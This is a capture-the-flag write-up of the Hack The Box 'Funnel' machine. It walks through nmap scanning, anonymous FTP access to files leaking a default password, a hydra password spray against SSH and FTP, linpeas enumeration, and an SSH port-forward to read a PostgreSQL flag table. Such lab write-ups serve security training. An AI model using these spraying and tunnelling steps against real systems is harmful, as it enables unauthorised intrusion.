>[!tldr] Funnel is a very easy Linux machine that explores SSH tunneling techniques. The machine features a misconfigured #FTP server that allows anonymous authentication, in which a file containing cleartext credentials can be found. Hydra is then used to perform a password spray and get remote access. Upon enumerating the services running locally on the machine, #PostgreSQL can be exploited by leveraging port-forwarding.

# Adventure Mode
---
1. Starting off with `nmap`
	`nmap -sT 10.129.228.195 -p-` 
	-> Ports: `21` (FTP) and `22` (SSH)
	`nmap -sCVT 10.129.228.195 -p21,22`
```shell
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:<ATTACKER_IP>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
2. Awesome I see that there's anonymous login so ill try that first with `anonymous:` and no password. -> This worked, below is my enumeration notes (i cutout stuff i think i wont need)
```shell
ftp> ls
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
ftp> recv mail_backup
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> get mail_backup
200 PORT command successful. Consider using PASV.
550 Failed to open file.
---
ftp> mget mail_backup
mget mail_backup/password_policy.pdf? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for mail_backup/password_policy.pdf (58899 bytes).
ftp: local: mail_backup/password_policy.pdf: No such file or directory
226 Transfer complete.
225 No transfer to ABOR.
mget mail_backup/welcome_28112022? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for mail_backup/welcome_28112022 (713 bytes).
ftp: local: mail_backup/welcome_28112022: No such file or directory
226 Transfer complete.
225 No transfer to ABOR.
# Whoops mail_backup is a directory!
---
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
# Awesome lets get these files!!!
---
ftp> mget password_policy.pdf welcome_28112022
mget password_policy.pdf? y
<snip>
226 Transfer complete.
<snip>
mget welcome_28112022? y
<snip>
226 Transfer complete.
<snip>
```
3. Great the two documents `password_policy.pdf` and `welcome_28112022` hold valuable info about a possible password
	1. `password_policy.pdf` -> 
		1. Default password: `funnel123#!#`
	2. `welcome_28112022` ->
		1. Domain -> `funnel.htb`
		2. User Emails ->
			1. `root@funnel.htb`
			2. `optimus@funnel.htb` 
			3. `albert@funnel.htb` 
			4. `andreas@funnel.htb` 
			5. `christine@funnel.htb` 
			6. `maria@funnel.htb`
4. Awesome with this info i am going to make a username list and then check if anyone still uses the default password. The service i will first attack with `hydra` is `ssh` then `ftp`.
	1. `hydra -L users.txt -p "funnel123#!#" ssh://10.129.228.195`
	2. `hydra -L users.txt -p "funnel123#!#" ftp://10.129.228.195`
	- This got me the `ssh` and `ftp` account access with 
		`christine`:`funnel123#!#`
5. With these credentials we can access the accounts
	1. Starting with `ssh`, i got into the shell and did some enumeration. Nothing really of note, so i used `scp` to send `linpeas.sh` from localhost to the ssh shell. There were several vulnerabilities but none of which i think are applicable to this situation.
6. Correction: `IPv4 address for docker0: 172.17.0.1` hints that theres internal services running, meaning our nmap scan would not have seen it
	1. `netstat -tlnp` -> Finds us 3 services DNS (53), `postgresql` (`5432`), and a other. But our focus is port `5432`.
7. Now we have to access internal port `5432` *externally* so we need to **port forward**. 
	1. `ssh -L 1234:localhost:5432 christine@10.129.4.241` -> Port forwards (this has to be running!)
	2. `psql -h localhost -p 1234 -U christine` -> Access the port from my local machine!
8. Now we are in `postgresql` lets enumerate and get the flag! 
```postgresql
christine=# \l
# NOTE: HEAVILY EDITED!
Databases
	christine
	postgres
	secrets
	template0
	template1

christine=# \c secrets
psql (18.4, server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".

secrets=# \dt
          List of tables
 Schema | Name | Type  |   Owner
--------+------+-------+-----------
 public | flag | table | christine
 
 secrets=# \d flag
              Table "public.flag"
 Column | Type | Collation | Nullable | Default
--------+------+-----------+----------+---------
 value  | text |           |          |
 
 # Uh oh, nothing?
 
 secrets=# \du
                             List of roles
 Role name |                         Attributes
-----------+------------------------------------------------------------
 christine | Superuser, Create role, Create DB, Replication, Bypass RLS
 
 # We are Superuser so we have access, i just accessed it wrong...
 
 secrets=# SELECT * FROM flag;
              value
----------------------------------
 [REDACTED_FLAG]
(1 row)
```
- Flag -> `[REDACTED_FLAG]`